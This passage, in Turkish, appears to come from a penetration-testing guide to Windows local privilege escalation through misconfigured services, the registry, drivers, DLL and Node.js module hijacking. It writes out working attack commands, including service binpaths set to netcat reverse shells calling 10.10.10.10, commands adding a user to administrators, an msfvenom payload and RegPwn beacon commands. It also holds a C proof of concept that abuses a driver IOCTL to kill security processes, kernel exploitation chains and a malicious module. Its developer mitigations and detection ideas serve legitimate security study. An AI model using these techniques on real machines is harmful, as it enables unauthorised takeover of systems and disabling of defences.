### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

## Services

Service Triggers, belirli koşullar oluştuğunda Windows'un bir service başlatmasını sağlar (named pipe/RPC endpoint etkinliği, ETW events, IP kullanılabilirliği, cihazın bağlanması, GPO yenilemesi vb.). SERVICE_START hakları olmasa bile trigger'larını tetikleyerek ayrıcalıklı service'leri çoğu zaman başlatabilirsiniz. Enumeration ve activation tekniklerini burada görebilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

Service listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir service hakkında bilgi almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her servis için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_ tarafından sağlanan **accesschk** binary'sine sahip olunması önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir servisi değiştirip değiştiremediğinin kontrol edilmesi önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Service'i etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Şunu kullanarak etkinleştirebilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost hizmetinin çalışmak için SSDPSRV'ye bağlı olduğunu dikkate alın (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Servis binary path'ini değiştirme**

"Authenticated users" grubunun bir servis üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir binary'sini değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlatma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Service binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve service configuration'larını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahiplik edinilmesine ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Service configuration'larını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Ayrıca service configuration'larını değiştirme yeteneğini devralır.

Bu vulnerability'nin detection ve exploitation işlemleri için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

Bir service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain account olarak çalışıyorsa, ancak **düşük ayrıcalıklı users service EXE'sini veya üst klasörünü değiştirebiliyorsa**, service genellikle **binary'yi değiştirip service'i yeniden başlatarak** hijack edilebilir.

**Bir service tarafından çalıştırılan binary'yi değiştirebilip değiştiremeyeceğinizi** veya binary'nin bulunduğu **folder** üzerinde **write permissions** sahibi olup olmadığınızı kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir service tarafından çalıştırılan tüm binary'leri **wmic** kullanarak (system32 içinde olmayanları) alabilir ve **icacls** kullanarak izinlerinizi kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** gruplarına verilmiş tehlikeli ACL'leri, özellikle hizmet yürütülebilir dosyasında veya bu dosyayı içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Pratik bir abuse akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve yürütülebilir dosya yolunu doğrulayın.
2. `icacls <path>` ile binary dosyasının yazılabilir olduğunu doğrulayın.
3. Hizmet binary dosyasını bir payload veya geçerli bir malicious service binary ile değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatmayı / hizmet tetikleyicisini bekleyin).

Kullanışlı automated checks:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, hizmetin önyükleme sırasında otomatik olarak başlayıp başlamadığını, yeniden başlatılmasını sağlayan bir failure action içerip içermediğini veya onu kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Hizmet kayıt defterini değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **registry** üzerindeki **permissions** değerlerinizi şu şekilde **check** edebilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** gruplarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahipse, service tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** işlemi tarafından bir HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Bir registry **symbolic link race**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM path**'ine yönlendirerek rastgele bir HKLM **value write** primitive'i sağlar.<sup>[[18]](#references)</sup>

Key locations (örnek: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü Accessibility özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı kontrollü yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, logon/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** value'sunu doldurun.
2. Secure-desktop copy işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker flow'u başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** yerleştirerek **race**'i kazanın; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM target'ına işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği value'yu yönlendirilen HKLM path'ine yazar.

Rastgele HKLM value write elde ettikten sonra service configuration value'larını üzerine yazarak LPE'ye geçiş yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir service seçin (ör. **`msiserver`**) ve write işleminden sonra onu tetikleyin. **Note:** public exploit implementation, race'in bir parçası olarak **workstation**'ı kilitler.

Example tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

If you have this permission over a registry this means **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olmayan tüm tırnak içine alınmamış hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu güvenlik açığını metasploit ile tespit edip istismar edebilirsiniz:** `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir servis binary'si oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir service başarısız olduğunda gerçekleştirilecek eylemleri belirtmelerine olanak tanır. Bu özellik, bir binary'ye işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) içinde bulunabilir.

## Uygulamalar

### Yüklü Uygulamalar

**binary'lerin izinlerini** (belki birini üzerine yazabilir ve privilege escalation gerçekleştirebilirsiniz) ve klasörlerin izinlerini ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için herhangi bir config dosyasını değiştirebiliyor musunuz veya bir Administrator hesabı tarafından çalıştırılacak bir binary dosyayı değiştirebiliyor musunuz kontrol edin (schedtasks).

Sistemdeki zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++, `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik olarak yükler. Yazılabilir bir portable/kopya kurulum mevcutsa, kötü amaçlı bir plugin yerleştirmek her başlatmada `notepad++.exe` içinde otomatik kod çalıştırılmasını sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bazı registry veya binary dosyalarının üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetkileri yükseltmek için ilgi çekici **autoruns konumları** hakkında daha fazla bilgi edinmek üzere **aşağıdaki sayfayı** okuyun:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Olası **üçüncü taraf şüpheli/zafiyetli** driver'ları arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Bir driver, arbitrary kernel read/write primitive'i açığa çıkarıyorsa (kötü tasarlanmış IOCTL handler'larında yaygındır), kernel memory'den doğrudan bir SYSTEM token çalarak privilege escalation gerçekleştirebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vulnerable call'un attacker-controlled bir Object Manager path açtığı race-condition bug'larında, lookup işlemini kasıtlı olarak yavaşlatmak (max-length component'ler veya derin directory chain'leri kullanarak) pencereyi mikrosaniyelerden onlarca mikrosaniyeye genişletebilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE chain'leri, tek başlarına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi free eden bir **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında freed bir paged-pool allocation'ı leak eden bir **lock-release-before-copy** disclosure.<sup>[[29]](#references)</sup>

Audit ve exploitation notları:

- **Free-under-lock + cancel afterwards**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşıyorsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde engellenmiş bir thread daha sonra devam edebilir ve freed bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine geri gönderebilir.
- Freed queue object'i, aynı boyutta attacker-controlled bir paged-pool allocation ile **reclaim** edin. `NPFS` Data Queue Entries kullanışlıdır; payload ve size kontrol edilebilir ve bunları daha sonra pipe read/peek operasyonlarıyla probe edebilirsiniz. Freed object list link'leri içeriyorsa bunları **user memory'de fake request node'larından oluşan cyclic list** ile overwrite edin; böylece driver, orijinal list head'de sonlanmak yerine attacker-defined request structure'larını tekrar tekrar işler.
- **Predictable write'ı upgrade edin**: fake request, bookkeeping write'larda (timestamp / QPC / refcount-adjacent field'lar) kullanılan nested context pointer'ı redirect ediyorsa, **address-controlled but not value-controlled** bir kernel write elde edebilirsiniz. Bu durumda final code/data pointer yerine sprayed pool object'in **length/size** field'ını hedefleyin, ardından corrupted object'in **out-of-bounds paged-pool read** sağlamasına kadar spray'i enumerate edin.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan herhangi bir syscall güçlü bir adaydır. Attacker copied buffer'ı büyütebiliyorsa reliability artar (örneğin serializer'ın final allocation size'ını artıran çok sayıda list/resource entry ekleyerek); çünkü daha uzun copy, machine'i mutlaka crash ettirmeden replacement window'u genişletir.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer array'leri mükemmel disclosure target'larıdır; çünkü paged-pool size attacker-controlled'dır (`8 * regBufferCnt`) ve her element bir `_IOP_MC_BUFFER_ENTRY`'e kernel pointer'ıdır. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i recovery edin, ardından **`RegBuffers`** ve **`RegBuffersCount`** değerlerini corrupt edin; böylece sonraki I/O ring operasyonları attacker-forged entry'leri tüketir ve arbitrary kernel read/write sağlar. Kullanılabilen tek write size sabit bir byte veriyorsa (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **overlapping unaligned write**'lar kullanın, bunu `VirtualAlloc` ile map edin ve forged registered-buffer array'i buraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Arbitrary kernel read/write elde ettikten sonra, standart post-primitive workflow'u kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive zafiyetleri, deterministik yerleşimleri düzenlemenize, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve özel bir driver olmadan metadata corruption'ı kernel paged-pool overflow'larına dönüştürmenize olanak tanır. Tam zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Bazı driver'lar userland'den bir registry path kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'ına `RTL_QUERY_REGISTRY_DIRECT` ile yapar. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse, `EntryContext` geliştiricinin beklediği türe göre değil, **gerçek** registry türüne göre yorumlanır.

Bu, iki kullanışlı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı kontrollü mutlak bir `\Registry\...` path'i, driver'ın saldırganın seçtiği key'leri sorgulamasına, return code/log'lar üzerinden varlık bilgisini leak etmesine ve bazı durumlarda caller'ın doğrudan erişemeyeceği değerleri okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar destination, registry value türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış binary buffer olarak type-confused hale gelir.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_DIRECT` ile ancak `RTL_QUERY_REGISTRY_TYPECHECK` olmadan **untrusted hive**'a erişirse, kernel caller'lar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploitability'yi korumak için değerleri `HKCU` altında hazırlamak yerine **trusted system hive**'lar içindeki **attacker-writable key**'leri arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki yazılabilir descendant'ları enumerate etmek için NtObjectManager kullanın ve sandboxed context'lerden erişilebilen key'leri bulmak üzere taramayı duplicated **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4 baytlık bir `int` içine yapılan 8 baytlık doğrudan yazma, komşu stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext` değerinin bir `UNICODE_STRING` işaret etmesini bekler. Kod önce saldırgan kontrollü bir `REG_DWORD` değerini stack üzerindeki bir scalar'a yükler ve ardından aynı buffer'ı string okuma için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkiler; bunun sonucunda kısmen kontrollü bir kernel yazması elde edilir.
- **`REG_BINARY`**: büyük binary veriler için direct mode, `EntryContext` adresindeki ilk `LONG` değerini signed buffer size olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar içinde **negative** ve saldırgan kontrollü bir değer bırakırsa sonraki `REG_BINARY` sorgusu, saldırganın byte'larını doğrudan komşu stack slot'larının üzerine kopyalar; bu da çoğu zaman callback-pointer overwrite elde etmenin en temiz yoludur.

Güçlü hunting pattern: **aynı stack variable içine, yeniden başlatmadan heterogeneous registry reads yapılması**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'larını ve ilk registry read'in ikinci read'in gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path'lerini arayın.

#### Device object'lerde eksik FILE_DEVICE_SECURE_OPEN değerinin kötüye kullanılması (LPE + EDR kill)

Bazı imzalı third-party driver'lar, IoCreateDeviceSecure üzerinden güçlü bir SDDL ile device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN değerini ayarlamayı unutur. Bu flag olmadan, device ekstra bir component içeren bir path üzerinden açıldığında secure DACL uygulanmaz; böylece herhangi bir unprivileged user aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir vaka)

Bir user device'ı açabildiğinde, driver tarafından sunulan privileged IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek ortamlarda gözlemlenen örnek yetenekler:
- Arbitrary process'lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil arbitrary process'leri sonlandırma; bu sayede AV/EDR, kernel üzerinden user land'den kill edilebilir.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- DACL ile kısıtlanması amaçlanan device object'lerini oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Privileged operations için caller context'i doğrulayın. Process termination veya handle returns işlemlerine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri (access masks, METHOD_*, input validation) kısıtlayın ve doğrudan kernel privileges yerine brokered modelleri değerlendirin.

Detection ideas for defenders
- Şüpheli device names (ör. \\ .\\amsdk*) için user-mode opens işlemlerini ve abuse göstergesi olan belirli IOCTL sequences'larını izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny list'lerinizi koruyun.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir klasörün içinde write permissions'a** sahipseniz, bir process tarafından yüklenen DLL'i hijack edebilir ve **privileges'ı escalate edebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin permissions'larını kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl abuse edileceği hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron module resolution hijacking

Bu, `require("foo")` gibi bare import gerçekleştiren ve beklenen module **eksik** olduğunda etkilenen **Node.js** ve **Electron** uygulamalarını hedefleyen bir **Windows uncontrolled search path** varyantıdır.<sup>[[20]](#references)</sup>

Node, directory tree içinde yukarı doğru ilerleyerek her parent üzerindeki `node_modules` klasörlerini kontrol ederek package'ları çözümler. Windows'ta bu arama drive root'a kadar ulaşabilir; bu nedenle `C:\Users\Administrator\project\app.js` üzerinden başlatılan bir uygulama şu yolları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Eğer bir **low-privileged user** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya package folder) yerleştirip **higher-privileged Node/Electron process**'in eksik dependency'yi çözümlemesini bekleyebilir. Payload, victim process'in security context'i içinde çalışır; bu nedenle hedef administrator olarak, elevated scheduled task/service wrapper üzerinden veya auto-started privileged desktop app olarak çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu koşullarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- üçüncü taraf bir library `require("foo")` çağrısını `try/catch` içine alıp hata durumunda çalışmaya devam ettiğinde
- bir package production build'lerinden kaldırıldığında, packaging sırasında dahil edilmediğinde veya kurulumu başarısız olduğunda
- vulnerable `require()` ana uygulama kodu yerine dependency tree'nin derinliklerinde bulunduğunda

### Vulnerable target'ları arama

Resolution path'i doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` = hedef executable (`node.exe`, Electron app EXE'si veya wrapper process) olacak şekilde filtreleyin
- `Path` değerini `node_modules` `contains` olacak şekilde filtreleyin
- `NAME NOT FOUND` ve `C:\node_modules` altındaki son başarılı open işlemine odaklanın

Unpacked `.asar` dosyalarında veya application source'larında kullanılabilecek faydalı code-review pattern'leri:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon veya kaynak incelemesinden **eksik paket adını** belirleyin.
2. Henüz mevcut değilse kök arama dizinini oluşturun:
```powershell
mkdir C:\node_modules
```
3. Beklenen tam ada sahip bir module bırak:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Mağdur uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu kalıba uyan eksik optional modüllere gerçek dünyadan örnek olarak `bluebird` ve `utf-8-validate` verilebilir; ancak yeniden kullanılabilir olan kısım **technique**'tir: ayrıcalıklı bir Windows Node/Electron sürecinin resolve edeceği herhangi bir **missing bare import** bulun.

### Tespit ve hardening fikirleri

- Bir kullanıcının `C:\node_modules` oluşturması veya buraya yeni `.js` dosyaları/paketleri yazması durumunda uyarı oluşturun.
- Yüksek bütünlük seviyesindeki süreçlerin `C:\node_modules\*` konumundan okuma yapmasını araştırın.
- Production ortamındaki tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarında sessiz `try { require("...") } catch {}` kalıplarını inceleyin.
- Kütüphane destekliyorsa optional probe'ları devre dışı bırakın (örneğin bazı `ws` deployment'ları, `WS_NO_UTF_8_VALIDATE=1` ile legacy `utf-8-validate` probe'unu önleyebilir).

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
